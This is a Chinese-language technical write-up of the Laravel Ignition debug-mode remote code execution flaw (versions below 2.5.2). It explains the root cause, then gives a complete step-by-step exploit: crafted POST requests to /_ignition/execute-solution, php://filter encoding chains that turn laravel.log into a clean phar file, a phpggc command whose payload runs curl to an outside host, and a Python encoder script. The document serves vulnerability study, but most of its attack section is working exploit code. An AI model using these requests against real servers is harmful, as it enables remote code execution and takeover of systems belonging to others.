[TOC]

# 0x00 漏洞成因

影响版本：Ignition<2.5.2

根据补丁来diff，发现补丁位于Ignition的一个Solution子类中。根据Igniter源码发现存在路由，找到ExecuteSolution路由可以动态执行Solution。

构造路由请求有洞的Solution。

POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=abc

这个漏洞是先通过`file_get_contents()`读取文件内容，然后进行一些修改。最后使用`file_put_contents()`保存文件。大概代码如下：

$output = file\_get\_contents($parameters\['viewFile'\]);

//省略xxx（对$output做一些处理）
//xxx

file\_put\_contents($parameters\['viewFile'\], $output);

由于这里无法任意修改`$content`，因此`$content`没有利用价值。把目光放到`viewFile`。由于文件协议可控，因此这里可以尝试利用`phar`来进行反序列化。

如果想要使用phar，首先需要可以控制服务器上的一个完整的文件，刚好laravel的日志文件`storage/logs/laravel.log`就可以利用。通过本漏洞的路由请求一个不存在的文件名作为`viewFile`的值，就可以把这个值保存到log文件中。

[![](vx_images/198355816257875.xml)](https://xzfile.aliyuncs.com/media/upload/picture/20210130165439-c9259652-62d8-1.png)

[![](vx_images/195145816260271.xml)](https://xzfile.aliyuncs.com/media/upload/picture/20210130165503-d79f99b2-62d8-1.png)

可以看到有三处POCPOCPOC被写入（最后一处在stack中，因此如果POC超过15位，则从16位开始变成...，也就是123456789012345...）。可是phar反序列化需要一个干净的phar文件，而这个文件在POC的两侧都有垃圾字符。因此下面需要尝试把垃圾字符去掉，只保留我们的POC

# 0x01 去掉垃圾字符

这里漏洞发现者想要通过`php://filter`过滤器来对文件进行一些操作。

这里主要的思路是先把我们的poc进行一些编码，最后再使用`php://filter/write=`来进行相应的解码，解码的同时去掉log中的其他字符。

为了方便后续的操作，首先是通过多次base64解码来清空log中之前的信息。第一次base64解码会把原文件变成乱码，再进行多次解码即可基本清空文件。可能一次请求后会抛出一个base64解码的warning到日志文件中。只需要再请求一次即可。

`php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=xxx/storage/logs/laravel.log`

然后就是去掉发送poc时其他的垃圾字符，这里会用到一些编码知识。主要就是`utf-16le`和`utf-8`的区别，`utf-16le`是两个字节代表一个字符（le是指小端模式），`utf-8`是一个字节代表一个字符。利用这个特性，我们可以把一串`utf8`字符当作`utf16`，在这样转换时字符串就会变成非ascii的乱码。由于这些是非ascii字符，因此使用base64解码时会被清空。php过滤器中刚好存在这些过滤器，即`php://filter/read=convert.iconv.utf-16le.utf-8/resource=xxx.txt`，是指把xxx.txt的内容视作`utf16`，并将其转换成`utf8`。

综上所述，我们可以先把POC base64编码，然后进行utf-8转utf-16le。在读log文件时先进行utf-16le转utf-8，这样之前的字符都会变成乱码而POC不会，然后使用base64解码，就会去掉乱码，只剩下POC明文。

构造payload的过程就是`明文->base64->utf8转utf16le`，下面看如何构造这个payload，也就是utf-8如何转成utf-16le，这里做个实验，看看两者的区别。

<?php
$filename \= "php://filter/write=convert.iconv.utf-8.utf-16le/resource=kkk4.txt"; //utf-16le编码写入文件
//$filename = "kkk4.txt";//utf-8写入文件

file\_put\_contents($filename, "<? abc$%^&\*();");

两种编码写入的文件依次如下，可以发现utf-16le编码会在utf-8的字符后加上一个`\00`空字节。

[![](vx_images/192095816242391.xml)](https://xzfile.aliyuncs.com/media/upload/picture/20210130165542-eecc4f36-62d8-1.png)

[![](vx_images/189035816246637.xml)](https://xzfile.aliyuncs.com/media/upload/picture/20210130165536-eb47e21c-62d8-1.png)

utf-8转utf-16le需要在每个字符**后面**加上一个`\00`字节，因此可以在HTTP请求中加上`%00`替代。不过`%00`会导致file\_get\_contents()报错，因此要使用别的方法。

这里就要介绍`convert.quoted-printable-encode`过滤器，它可以把所有的不可见字符转换成`=xx`，比如把`\00`转换成`=00`。

这是思路就清晰了，先举个简单的例子，首先构造一个代表`poc`base64编码的字符串`cG9j`的payload：  
`asdfaasdabcdc=00G=009=00j=00defasdfasdf`，可以看到两侧都是垃圾字符。  
读取时，使用如下的过滤器：  
`php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=xxxx/laravel.log`，最终即可把poc还原出来。

在实际利用时有不少坑点

1.之前说了`laravel.log`文件中有三处会显示我们的payload，其中最后一处当payload过长时，从第十六个字符开始都会省略成`...`，因此我们要保证第十六个字符不在`=`的后两位，比如`=0.`、`=..`会导致`quoted-printable-decode`过滤器返回空结果。因此需要在payload前填充15个字符，让第三处不显示payload即可。  
2.由于`convert.quoted-printable-decode`会对`=`当作特殊字符，因此base64结尾可能有的`=`会造成解析出错（原因与2一样），因此需要手动把base64编码后的`=`替换成`=3D`，对于base64编码中的`+`最好也替换成`=2B`。  
3.发送poc之后，使用过滤器来解析log时，如果laravel.log最终的字节数为奇数，那么在`utf-16le->utf-8`时又会抛出一条新日志，这样后续的base64 decode就会失败了。由于我们的poc会在log中出现两次，因此所有poc字符数必然是偶数个，影响log文件字符数奇偶的只能是log框架文本本身的字符数。只要在我们发送poc之前提前发送一个偶数文件名的请求，这样最终的log中就会有两次log框架本身的字符，因此必为偶数。

# 0x02 Attack

## step0 清除原log中的字符

```
POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 217

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log

```
## step1 发送偶数文件名的请求

（对应坑3）

```
POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=11

```
## step2 发送poc

```
POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2401

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=xxxxx

```

`xxxxx`就是payload，通过以下步骤获得：

```
./phpggc monolog/rce1 system "curl http://ip/success" --phar phar -o php://output | base64
```

把输出的结果经过下面的python脚本转换一下：

```
from binascii import b2a\_hex
payload \= "xxx" \# base64 payload
armedPayload \= ''
for i in payload:
    i \= "="+b2a\_hex(i.encode('utf-8')).decode('utf-8').upper()
    armedPayload += i+"=00"
print("123456789012345"+armedPayload)#前面加15个字符，对应坑1

```
这里输出的结果直接放到上面的文件名中。

## step3 清空垃圾字符，poc解码成phar文件内容

```
POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 310

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

## step4 触发phar反序列化

```
POST /\_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 206

solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters\[variableName\]=123&parameters\[viewFile\]=phar:///xxxx/laravel/storage/logs/laravel.log
```

注意这里的路径要换成`laravel.log`的绝对路径。

# 0x03 思考

在刚拿到这个漏洞时仅看了漏洞通告以及git补丁，先通过Ignition文档了解了Solution的作用和调用方式，然后发现Solution似乎只有在`blade`模版出错时才会被调用到，可是没法手动指定模版，所以这个洞也就没有找到入口。看了眼exp的url，发现竟然是诡异的`/_ignition/`，这个路由在Laravel给的Controller中是没有的。翻了下Ignition的源码，发现这个项目动态添加了路由并注册了几个Controller，最后才到了调用点。

这个漏洞的主要攻击方式就是phar，不过最有意思的点是利用`php://filter`伪协议将一个部分可控的文件变成完全可控，这个漏洞是先通过`file_put_contents()`写文件时用`php://filter/write=xxx`来进行解码，其实也可以使用`php://filter/read=xxx`在`file_get_contents()`处进行解码。

对于这个漏洞，发现者还提出了一种利用FTP被动模式攻击PHP-FPM的攻击思路。第一次使用`file_get_contents()`请求恶意ftp请求，获取payload，然后通过`file_put_contents()`结合FTP被动模式，把上面的payload发送到php-fpm的端口实现RCE。

这里贴两篇文章，以后再细说，留个坑。：）

[技术干货 | LARAVEL <= V8.4.2 调试模式下的RCE分析](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=)

[hxp2020的resonator题解分析](https://www.anquanke.com/post/id/226750)

# 0x04 参考

[Laravel <= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce)  
[PHP Conversion Filters](https://www.php.net/manual/en/filters.convert.php)  
[Using solution providers](https://flareapp.io/docs/solutions/using-solution-providers)